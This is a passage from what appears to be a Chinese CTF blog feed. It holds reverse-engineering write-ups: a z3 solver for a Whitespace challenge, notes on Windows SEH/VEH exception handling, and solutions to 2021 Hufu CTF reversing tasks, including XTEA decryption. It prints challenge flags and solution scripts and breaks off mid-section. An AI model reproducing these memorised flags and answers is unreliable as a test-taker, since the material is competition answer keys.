class="number">2</span>, <span class="number">9</span>: <span class="number">10</span>, <span class="number">10</span>: <span class="number">10</span>, <span class="number">11</span>: <span class="number">8</span>, <span class="number">12</span>: <span class="number">3</span>, <span class="number">13</span>: <span class="number">11</span>, <span class="number">14</span>: <span class="number">1753</span>, <span class="number">15</span>: <span class="number">7</span>, <span class="number">16</span>: <span class="number">17</span>, <span class="number">17</span>: <span class="number">6</span>, <span class="number">18</span>: <span class="number">4</span>, <span class="number">19</span>: <span class="number">8</span>, <span class="number">20</span>: <span class="number">16</span>, <span class="number">21</span>: <span class="number">2117</span>, <span class="number">22</span>: <span class="number">4</span>, <span class="number">23</span>: <span class="number">5</span>, <span class="number">24</span>: <span class="number">3</span>, <span class="number">25</span>: <span class="number">15</span>, <span class="number">26</span>: <span class="number">6</span>, <span class="number">27</span>: <span class="number">6</span>, <span class="number">28</span>: <span class="number">1071</span>, <span class="number">29</span>: <span class="number">3</span>, <span class="number">30</span>: <span class="number">17</span>, <span class="number">31</span>: <span class="number">5</span>, <span class="number">32</span>: <span class="number">4</span>, <span class="number">33</span>: <span class="number">2</span>, <span class="number">34</span>: <span class="number">16</span>, <span class="number">35</span>: <span class="number">1116</span>, <span class="number">36</span>: <span class="number">10</span>, <span class="number">37</span>: <span class="number">14</span>, <span class="number">38</span>: <span class="number">4</span>, <span class="number">39</span>: <span class="number">0</span>, <span class="number">40</span>: <span class="number">10</span>, <span class="number">41</span>: <span class="number">9</span>, <span class="number">42</span>: <span class="number">2190</span>, <span class="number">43</span>: <span class="number">9</span>, <span class="number">44</span>: <span class="number">14</span>, <span class="number">45</span>: <span class="number">4</span>, <span class="number">46</span>: <span class="number">0</span>, <span class="number">47</span>: <span class="number">4</span>, <span class="number">48</span>: <span class="number">9</span>, <span class="number">49</span>: <span class="number">1764</span>, <span class="number">50</span>: <span class="number">2</span>, <span class="number">51</span>: <span class="number">3</span>, <span class="number">52</span>: <span class="number">1</span>, <span class="number">53</span>: <span class="number">2</span>, <span class="number">54</span>: <span class="number">3</span>, <span class="number">55</span>: <span class="number">1</span>, <span class="number">56</span>: <span class="number">617</span>, <span class="number">57</span>: <span class="number">9</span>, <span class="number">58</span>: <span class="number">14</span>, <span class="number">59</span>: <span class="number">8</span>, <span class="number">60</span>: <span class="number">0</span>, <span class="number">61</span>: <span class="number">3</span>, <span class="number">62</span>: <span class="number">9</span>, <span class="number">63</span>: <span class="number">2193</span>, <span class="number">64</span>: <span class="number">1</span>, <span class="number">65</span>: <span class="number">17</span>, <span class="number">66</span>: <span class="number">5</span>, <span class="number">67</span>: <span class="number">4</span>, <span class="number">68</span>: <span class="number">2</span>, <span class="number">69</span>: <span class="number">16</span>, <span class="number">70</span>: <span class="number">866</span>, <span class="number">71</span>: <span class="number">8</span>, <span class="number">72</span>: <span class="number">5</span>, <span class="number">73</span>: <span class="number">2</span>, <span class="number">74</span>: <span class="number">15</span>, <span class="number">75</span>: <span class="number">8</span>, <span class="number">76</span>: <span class="number">6</span>, <span class="number">77</span>: <span class="number">1594</span>, <span class="number">78</span>: <span class="number">5</span>, <span class="number">79</span>: <span class="number">12</span>, <span class="number">80</span>: <span class="number">10</span>, <span class="number">81</span>: <span class="number">13</span>, <span class="number">82</span>: <span class="number">2</span>, <span class="number">83</span>: <span class="number">7</span>, <span class="number">84</span>: <span class="number">1153</span>, <span class="number">85</span>: <span class="number">10</span>, <span class="number">86</span>: <span class="number">12</span>, <span class="number">87</span>: <span class="number">5</span>, <span class="number">88</span>: <span class="number">13</span>, <span class="number">89</span>: <span class="number">8</span>, <span class="number">90</span>: <span class="number">7</span>, <span class="number">91</span>: <span class="number">1737</span>, <span class="number">92</span>: <span class="number">5</span>, <span class="number">93</span>: <span class="number">12</span>, <span class="number">94</span>: <span class="number">9</span>, <span class="number">95</span>: <span class="number">13</span>, <span class="number">96</span>: <span class="number">9</span>, <span class="number">97</span>: <span class="number">7</span>, <span class="number">98</span>: <span class="number">1445</span>, <span class="number">99</span>: <span class="number">4</span>, <span class="number">100</span>: <span class="number">10</span>, <span class="number">101</span>: <span class="number">7</span>, <span class="number">102</span>: <span class="number">8</span>, <span class="number">103</span>: <span class="number">7</span>, <span class="number">104</span>: <span class="number">11</span>, <span class="number">105</span>: <span class="number">2119</span>, <span class="number">106</span>: <span class="number">5</span>, <span class="number">107</span>: <span class="number">3</span>, <span class="number">108</span>: <span class="number">2</span>, <span class="number">109</span>: <span class="number">2</span>, </span><br><span class="line"><span class="number">110</span>: <span class="number">5</span>, <span class="number">111</span>: <span class="number">1</span>, <span class="number">112</span>: <span class="number">1237</span>, <span class="number">113</span>: <span class="number">9</span>, <span class="number">114</span>: <span class="number">5</span>, <span class="number">115</span>: <span class="number">8</span>, <span class="number">116</span>: <span class="number">15</span>, <span class="number">117</span>: <span class="number">4</span>, <span class="number">118</span>: <span class="number">6</span>, <span class="number">119</span>: <span class="number">1463</span>, <span class="number">120</span>: <span class="number">7</span>, <span class="number">121</span>: <span class="number">10</span>, <span class="number">122</span>: <span class="number">8</span>, <span class="number">123</span>: <span class="number">8</span>, <span class="number">124</span>: <span class="number">4</span>, <span class="number">125</span>: <span class="number">11</span>, <span class="number">126</span>: <span class="number">2217</span>, <span class="number">127</span>: <span class="number">6</span>, <span class="number">128</span>: <span class="number">3</span>, <span class="number">129</span>: <span class="number">10</span>, <span class="number">130</span>: <span class="number">2</span>, <span class="number">131</span>: <span class="number">1</span>, <span class="number">132</span>: <span class="number">1</span>, <span class="number">133</span>: <span class="number">1871</span>&#125;</span><br><span class="line"></span><br><span class="line">s=Solver()</span><br><span class="line">x=IntVector(<span class="string">&#x27;x&#x27;</span>,<span class="number">18</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>,<span class="number">7</span>*<span class="number">18</span>+<span class="number">8</span>,<span class="number">7</span>):</span><br><span class="line">    s.add(heap[i]*(x[heap[i+<span class="number">1</span>]]) +heap[i+<span class="number">2</span>]*(x[heap[i+<span class="number">3</span>]]) +heap[i+<span class="number">4</span>]*(x[heap[i+<span class="number">5</span>]])==heap[i+<span class="number">6</span>])</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br><span class="line">ans=s.model()</span><br><span class="line">x10,x8,x11=Ints(<span class="string">&#x27;x10 x8 x11&#x27;</span>)</span><br><span class="line">[<span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(ans[i]))),end=<span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> x]</span><br><span class="line"><span class="comment">#xctf&#123;Wh1t3sym3x!?&#125;</span></span><br></pre></td></tr></table></figure><p>​                </p><p>​                复现得到 <code>flag</code> 后还在谷歌上找到了有人在赛时写了个类似 <code>angr</code> 的对 <code>whitespace</code> 自动求解的    库，有空再研究</p><p>​                 <a href="https://github.com/umutoztunc/whitesymex">https://github.com/umutoztunc/whitesymex</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://zh.wikipedia.org/wiki/Whitespace">https://zh.wikipedia.org/wiki/Whitespace</a></li><li><a href="https://pypi.org/project/whitesymex/">https://pypi.org/project/whitesymex/</a></li><li><a href="https://github.com/umutoztunc/whitesymex">https://github.com/umutoztunc/whitesymex</a></li><li><a href="https://github.com/Smithers888/BlueSpace">https://github.com/Smithers888/BlueSpace</a></li><li>Vidar-Team writeup</li></ul>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;对 Xctf Final Re 题： SpaceShip 的复现&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    
    <category term="wp" scheme="https://www.0wl.site/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>windows 异常处理</title>
    <link href="https://www.0wl.site/2021/05/23/windows-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"/>
    <id>https://www.0wl.site/2021/05/23/windows-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</id>
    <published>2021-05-23T03:05:05.000Z</published>
    <updated>2021-11-16T14:54:59.283Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>简单总结一下有关  Windows 处理异常方面的知识</p></div></article><span id="more"></span><h2 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h2><h3 id="SEH-简单说明"><a href="#SEH-简单说明" class="headerlink" title="SEH 简单说明"></a>SEH 简单说明</h3><p>​    <code>SEH</code>是基于栈的异常处理，作用范围仅限当前线程，在程序产生异常时，如果程序正在被调试<code>os</code> 就会先把异常抛给调试器处理 ，调试器无法解决这一异常就会由进程处理，进程也无法处理就会交由 <code>os</code> 处理。</p><h3 id="SEH-结构"><a href="#SEH-结构" class="headerlink" title="SEH 结构"></a>SEH 结构</h3><h4 id="TEB-结构体"><a href="#TEB-结构体" class="headerlink" title="TEB 结构体"></a>TEB 结构体</h4><p>​    <code>TEB</code> 结构体是操作系统为了保存线程私有数据而创建的，<code>TIB</code> 是保存线程基本信息的数据结构。</p><p>​    在 x86 用户模式下可以由 FS 寄存器来访问当前线程 <code>TEB</code>数据，64位系统中则使用 gs 寄存器</p><h4 id="SEH-的链式结构"><a href="#SEH-的链式结构" class="headerlink" title="SEH 的链式结构"></a>SEH 的链式结构</h4><p>​    <code>SEH</code> 以链的形式存在，即链表，结构如图所示：</p><img src="/2021/05/23/windows-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/SEH%E7%BB%93%E6%9E%84.jpg" class=""><p>​    <code>SEH</code> 会在链表的头部进行异常处理函数的安装与卸载</p><img src="/2021/05/23/windows-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86.jpg" class=""><blockquote><p>TEB.NtTib.ExceptionList = FS:[0]  </p><p>ExceptionList 是 TIB 中与异常处理有关的项，指向 SEH 链</p></blockquote><h3 id="安装与卸载"><a href="#安装与卸载" class="headerlink" title="安装与卸载"></a>安装与卸载</h3><blockquote><p>安装</p><p>push @MyHandler  ;异常处理程序<br>push FS:[0]       ；SEH Linked List头<br>mov dword ptr fs:[0],esp  ;添加链表</p></blockquote><blockquote><p>卸载</p><p>mov esp,dword ptr fs:[0]<br>pop dword ptr fs:[0]</p></blockquote><p>​    安装与卸载一般发生在函数开始与结束处</p><h2 id="VEH"><a href="#VEH" class="headerlink" title="VEH"></a>VEH</h2><p>​    当异常发生时，<strong>VEH 会在 SEH 之前执行</strong>，如果 VEH 无法处理这一异常，就会由 SEH 继续处理异常</p><p>​    可通过 <code>AddVectorExceptionHandler</code> 这个 API 来注册回调函数，第一个参数可指定回调函数安装与卸载是在链表前端还是尾部</p><p>​    作用范围为整个进程，可捕获所有线程的异常</p><p>​    想要获取 <code>VEH</code> 异常的函数地址应该可以看程序中是否用到 <code>AddVectorExceptionHandler</code> 这个 API，第二个参数是异常处理函数</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>​    minilctf re2</p><img src="/2021/05/23/windows-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/example1.png" class=""><p>​    这里存在两个触发异常的点，一个是访问到了不能访问的内存，另一个是除0异常</p><img src="/2021/05/23/windows-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/example2.png" class=""><p>​    在 main 函数的开头发现异常处理函数安装的汇编代码，但调试过程中在 <code>__except_handler4</code> 下断点程序并不会停下，这里的 <code>__except_handler4</code> 里的函数应该是编译器添加的</p><img src="/2021/05/23/windows-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/example3.png" class=""><p>​    在 TLS 函数中可以发现注册了 VEH 的异常处理程序，根据 VEH 会先于 SEH 执行，在 Handler 函数下断就能使指定的异常触发时停下</p><p>​    当然有关 <code>Windows</code> 异常处理的知识还有很多，本文没有提到，待填</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>《加密与解密》</li><li>《逆向工程核心原理》</li><li><a href="https://bbs.pediy.com/thread-249592.htm">SEH详解</a></li><li><a href="https://docs.microsoft.com/enus/windows/win32/api/errhandlingapi/nf-errhandlingapi-addvectoredexceptionhandler">AddVectoredExceptionHandler</a></li><li><a href="https://bbs.pediy.com/thread-226235.htm">获取VEH SEH VCH UEF异常的函数地址</a></li><li><a href="https://bbs.pediy.com/thread-166472.htm">VEH分析</a></li><li><a href="https://www.anquanke.com/post/id/175753#h3-3">Windows调试艺术——从0开始的异常处理（下）</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;简单总结一下有关  Windows 处理异常方面的知识&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    
    <category term="windows" scheme="https://www.0wl.site/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>2021数字中国虎符CTF Re题复现</title>
    <link href="https://www.0wl.site/2021/04/05/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6CTF-Re%E9%A2%98%E5%A4%8D%E7%8E%B0/"/>
    <id>https://www.0wl.site/2021/04/05/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6CTF-Re%E9%A2%98%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-04-05T12:05:47.000Z</published>
    <updated>2021-11-16T14:52:46.806Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>2021虎符CTF  Re</p></div></article><span id="more"></span><h2 id="1-redemption-code"><a href="#1-redemption-code" class="headerlink" title="1.redemption_code"></a>1.redemption_code</h2><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>​        这题的重点在于理解验证兑换码函数 server_check_redemption_code 的算法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">server_check_redemption_code</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">char</span> *input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len1 = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">int</span> len2 = <span class="built_in">strlen</span>(input);</span><br><span class="line">    <span class="keyword">int</span> tmp = len2;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">14</span>*<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> maxsize = tmp &lt;&lt; <span class="number">10</span>;</span><br><span class="line">    s[input[<span class="number">0</span>]] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">int</span> v4;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; tmp; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">256</span>; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (j != input[i])</span><br><span class="line">                s[<span class="number">256</span> * i + j] = s[<span class="number">256</span> * v4 + j];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                s[<span class="number">256</span> * i + j] = i + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v4 = s[<span class="number">256</span> * v4 + input[i]];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> v7 = <span class="number">0</span>,k;</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; len1; ++k)</span><br><span class="line">    &#123;</span><br><span class="line">        v7 = s[<span class="number">256</span> * v7 + str[k]];<span class="comment">//能在str中找到与flag[i]相同的字符就移向下一行继续找</span></span><br><span class="line">        <span class="keyword">if</span> (v7 == tmp)<span class="comment">//str中包含flag的全部字符</span></span><br><span class="line">            <span class="keyword">return</span> k - tmp + <span class="number">1</span>; <span class="comment">// =7</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​        </p><p>​        用图来解释一下</p><img src="/2021/04/05/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6CTF-Re%E9%A2%98%E5%A4%8D%E7%8E%B0/re1.png" class=""><p>​        s数组相当于一个14*256的二维数组（输入长度得是14），函数内双重循环代表在以 flag[i] 为下标的地方存储当前的 i+1 值（第几个字符）</p><blockquote><p>str1[] = “Ninja Must Die 3 Is A Cruel Game, So Hard For Me”<br>str2[] = “I Love Ninja Must Die 3. Beautiful Art And Motive Operation Is Creative.”</p></blockquote><p>​        pre 函数检测 str1，根据check函数最后的循环返回结果不能是 -1，确定 flag 字符串在 str1中</p><p>​        检测 str2 的时候因为返回值要是7，所以 flag 结尾字符是 str2[20] = ‘e’，flag = “Ninja Must Die”</p><h3 id="验证："><a href="#验证：" class="headerlink" title="验证："></a>验证：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">server_check_redemption_code</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">char</span> *input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len1 = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">int</span> len2 = <span class="built_in">strlen</span>(input);</span><br><span class="line">    <span class="keyword">int</span> tmp = len2;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">14</span>*<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> maxsize = tmp &lt;&lt; <span class="number">10</span>;</span><br><span class="line">    s[input[<span class="number">0</span>]] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">int</span> v4;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; tmp; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">256</span>; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (j != input[i])</span><br><span class="line">                s[<span class="number">256</span> * i + j] = s[<span class="number">256</span> * v4 + j];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                s[<span class="number">256</span> * i + j] = i + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v4 = s[<span class="number">256</span> * v4 + input[i]];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> v7 = <span class="number">0</span>,k;</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; len1; ++k)</span><br><span class="line">    &#123;</span><br><span class="line">        v7 = s[<span class="number">256</span> * v7 + str[k]];</span><br><span class="line">        <span class="keyword">if</span> (v7 == tmp)</span><br><span class="line">            <span class="keyword">return</span> k - tmp + <span class="number">1</span>; <span class="comment">// =7</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str1[]=<span class="string">&quot;Ninja Must Die 3 Is A Cruel Game, So Hard For Me&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> str2[]=<span class="string">&quot;I Love Ninja Must Die 3. Beautiful Art And Motive Operation Is Creative.&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> flag[]=<span class="string">&quot;Ninja Must Die&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,server_check_redemption_code(str1,flag));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,server_check_redemption_code(str2,flag));</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-GoEncrypt"><a href="#2-GoEncrypt" class="headerlink" title="2.GoEncrypt"></a>2.GoEncrypt</h2><h3 id="分析：-1"><a href="#分析：-1" class="headerlink" title="分析："></a>分析：</h3><p>​        go 语言逆向，main_main 函数反汇编后可以看到有个 main_check ，main_NewCipher ，两个 Encrypt 加密，最后 internal_bytealg_Equal 比较<br>​        check 里面有 flag 的格式</p><blockquote><p>^flag{([0-9a-f]{8})-([0-9a-f]{4})-([0-9a-f]{4})-([0-9a-f]{4})-([0-9a-f]{12})}</p></blockquote><p>​        可以构造 flag 进行调试</p><blockquote><p>flag{abababab-abab-abab-abab-abababababab}</p></blockquote><img src="/2021/04/05/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6CTF-Re%E9%A2%98%E5%A4%8D%E7%8E%B0/go1.png" class=""><p>​    图中的函数将输入转为16进制，如 0xabababababababababababababababab，之后再分割成4个16进制数<br>​        加密的函数根据特点可以知道是 XTEA 加密<br>​<br>​        调试到 encrypt 函数时可以发现两个 encrypt 分别对两个4位的16进制数进行加密，密钥如下</p><img src="/2021/04/05/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6CTF-Re%E9%A2%98%E5%A4%8D%E7%8E%B0/go2.png" class=""><p>​        之后可以在 internal_bytealg_Equal 函数内找到 flag 的密文</p><img src="/2021/04/05/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6CTF-Re%E9%A2%98%E5%A4%8D%E7%8E%B0/go3.png" class=""><p>​        前面那些看起来像是汇编代码的实际调试时并不执行，关键只在这一部分</p><img src="/2021/04/05/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6CTF-Re%E9%A2%98%E5%A4%8D%E7%8E%B0/go4.png" class=""><h3 id="脚本："><a href="#脚本：" class="headerlink" title="脚本："></a>脚本：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> uint32_t unsigned int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decipher</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_rounds, <span class="keyword">uint32_t</span> v[<span class="number">2</span>], <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], delta = <span class="number">0x12345678</span>, sum = delta * num_rounds;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//uint32_t v1[2]=&#123;0x0EC311F0,0x45C79AF3 &#125;;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> v[<span class="number">2</span>] = &#123; <span class="number">0xedf5d910</span>,<span class="number">0x542702cb</span>&#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> <span class="keyword">const</span> k[<span class="number">4</span>] = &#123; <span class="number">0x10203</span>,<span class="number">0x4050607</span>,<span class="number">0x8090a0b</span>,<span class="number">0xc0d0e0f</span> &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> r = <span class="number">32</span>;<span class="comment">//num_rounds建议取值为32</span></span><br><span class="line">    <span class="comment">// v为要加密的数据是两个32位无符号整数</span></span><br><span class="line">    <span class="comment">// k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位</span></span><br><span class="line">    decipher(r, v, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;解密后的数据：0x%x 0x%x\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="3-Crackme"><a href="#3-Crackme" class="headerlink" title="3.Crackme"></a>3.Crackme</h2><p>​        反汇编出来 500 多行，要调试吐了。。。</p><h3 id="分析：-2"><a href="#分析：-2" class="headerlink" title="分析："></a>分析：</h3><p>​        先是输入一个长度为17的字符串，然后输入一个数字，对输入的数字进行运算后再判断</p><img src="/2021/04/05/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6CTF-Re%E9%A2%98%E5%A4%8D%E7%8E%B0/crack_me1.png" class=""><p>​        </p><img src="/2021/04/05/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6CTF-Re%E9%A2%98%E5%A4%8D%E7%8E%B0/crack_me2.png" class=""><p>​        虽然这个函数 ida 提示说结果可能错误，但是实际运算跟反汇编出来的是一样的（比赛当天因为这个卡了好久，一直在试图调试出正确的运算过程）</p><p>​        想要得到这个数字可以采取爆破的方法，多次输入并调试来缩小范围</p><p>​        之后把第一个输入的字符串分为前7个和后10个，分别异或加密</p><img src="/2021/04/05/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6CTF-Re%E9%A2%98%E5%A4%8D%E7%8E%B0/crack_me3.png" class=""><img src="/2021/04/05/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6CTF-Re%E9%A2%98%E5%A4%8D%E7%8E%B0/crack_me4.png" class=""><h3 